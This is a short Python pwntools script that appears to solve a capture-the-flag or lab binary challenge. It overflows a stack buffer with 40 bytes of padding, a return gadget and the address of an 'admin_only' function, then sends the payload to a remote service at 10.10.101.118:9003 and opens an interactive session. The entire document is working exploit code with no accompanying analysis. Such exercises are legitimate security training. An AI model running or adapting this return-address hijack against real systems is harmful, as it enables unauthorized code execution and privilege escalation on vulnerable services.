from pwn import *

admin_only = p64(0x401554)
ret_adress = p64(0x401677)
offset = 40

payload = b"A"*offset + ret_adress + admin_only
p = remote("10.10.101.118",9003)
p.recvuntil('channel:')
p.sendline('3')
p.recvuntil('[pwner]:')
p.sendline(payload)
p.interactive()
